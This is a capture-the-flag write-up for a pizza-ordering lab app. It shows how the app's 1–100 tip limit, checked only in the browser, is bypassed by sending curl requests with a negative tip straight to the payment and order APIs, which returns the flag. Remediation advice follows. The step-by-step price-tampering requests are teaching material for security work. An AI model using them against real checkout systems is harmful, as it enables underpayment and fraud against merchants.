# BugForge Daily CTF — Cheesy Does It

**Target:** `https://lab-1779703818610-ud636i.labs-app.bugforge.io/login`  
**Flag format:** `bug{flag}`  
**Hint:** Can you tamper with the price via the tip feature?

## Flag

```text
bug{FumN6jZaRJhBAARTc9uVNIDd73roTsyN}
```

## Summary

The application is a pizza ordering site called **Cheesy Does It**. The intended vulnerability is a server-side validation flaw in the checkout flow.

The frontend only allows custom tip percentages between `1` and `100`, but the API accepts a negative tip value. Sending `tip: -100` during checkout causes the order creation logic to trigger the flag. The flag is returned as the `order_number` of the created order.

## Recon

The login page serves a React single-page app:

```html
<script defer="defer" src="/static/js/main.2278dad4.js"></script>
```

The source map was available:

```text
/static/js/main.2278dad4.js.map
```

From the frontend source, the important API endpoints were:

```text
/api/register
/api/login
/api/verify-token
/api/menu/pizzas
/api/menu/bases
/api/menu/sauces
/api/menu/toppings
/api/payment/validate
/api/payment/process
/api/orders
/api/orders/:orderId
/api/admin/stats
/api/admin/users
/api/admin/orders
```

The checkout component showed the key client-side logic:

```js
const handleCustomTipChange = (e) => {
  const value = e.target.value;
  // Frontend validation: only allow 1-100
  if (value === '' || (Number(value) >= 1 && Number(value) <= 100)) {
    setCustomTip(value);
  }
};
```

However, this validation only happens in the browser and can be bypassed by calling the API directly.

## Exploitation

First, register a normal user account:

```bash
curl -sk -X POST 'https://lab-1779703818610-ud636i.labs-app.bugforge.io/api/register' \
  -H 'Content-Type: application/json' \
  -d '{
    "username":"testuser123",
    "email":"testuser123@example.com",
    "password":"password123",
    "full_name":"Test User",
    "phone":"555",
    "address":"123 Main St"
  }'
```

The response includes a bearer token:

```json
{
  "token": "...",
  "user": {
    "id": 7,
    "username": "testuser123"
  }
}
```

Set the token:

```bash
TOKEN='paste_token_here'
BASE='https://lab-1779703818610-ud636i.labs-app.bugforge.io'
```

Validate payment with a negative tip:

```bash
curl -sk -X POST "$BASE/api/payment/validate" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "card_number":"4444 4444 4444 4444",
    "exp_month":"12",
    "exp_year":"25",
    "cvv":"123",
    "amount":8.99,
    "tip":-100
  }'
```

The backend accepts it and returns a payment token:

```json
{
  "valid": true,
  "message": "Card validated successfully",
  "payment_token": "88387c9b-e825-469a-a8a6-a6665f65144f",
  "total": 8.99
}
```

Process payment using the returned token:

```bash
PAYMENT_TOKEN='paste_payment_token_here'

curl -sk -X POST "$BASE/api/payment/process" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d "{
    \"card_number\":\"4444 4444 4444 4444\",
    \"amount\":8.99,
    \"payment_token\":\"$PAYMENT_TOKEN\"
  }"
```

Then create an order with the same negative tip:

```bash
curl -sk -X POST "$BASE/api/orders" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d "{
    \"items\":[{
      \"pizza_name\":\"Custom Pizza\",
      \"base_name\":\"Thin Crust\",
      \"sauce_name\":\"Classic Tomato\",
      \"size\":\"Medium\",
      \"toppings\":[],
      \"quantity\":1,
      \"unit_price\":8.99,
      \"total_price\":8.99
    }],
    \"delivery_address\":\"123 Main St\",
    \"phone\":\"555\",
    \"payment_method\":\"card\",
    \"notes\":\"\",
    \"payment_token\":\"$PAYMENT_TOKEN\",
    \"tip\":-100
  }"
```

The order is accepted and the flag appears in the `order_number` field:

```json
{
  "id": 4,
  "order_number": "bug{FumN6jZaRJhBAARTc9uVNIDd73roTsyN}",
  "message": "Order created successfully",
  "status": "received"
}
```

## Root Cause

The application relies on frontend validation to restrict custom tips to `1–100%`, but the backend does not enforce the same rule consistently.

The backend accepts a negative tip in both:

```text
/api/payment/validate
/api/orders
```

This allows direct API tampering outside the browser UI. In this challenge, submitting `tip: -100` triggers the flag generation path.

## Impact

A user can tamper with checkout pricing parameters and submit values that the UI would normally prevent. In a real payment/order system, this could lead to payment inconsistencies, underpayment, negative totals, revenue manipulation, or logic abuse.

## Remediation

Validate all price-affecting fields server-side. Specifically:

- Reject negative tip percentages.
- Enforce an allowed range, e.g. `0 <= tip <= 100`.
- Recalculate order totals server-side from trusted menu data.
- Do not trust client-supplied item prices, quantities, or totals.
- Bind payment tokens to the exact validated order amount and order payload.

Example validation rule:

```js
if (!Number.isFinite(tip) || tip < 0 || tip > 100) {
  return res.status(400).json({ error: 'Invalid tip percentage' });
}
```
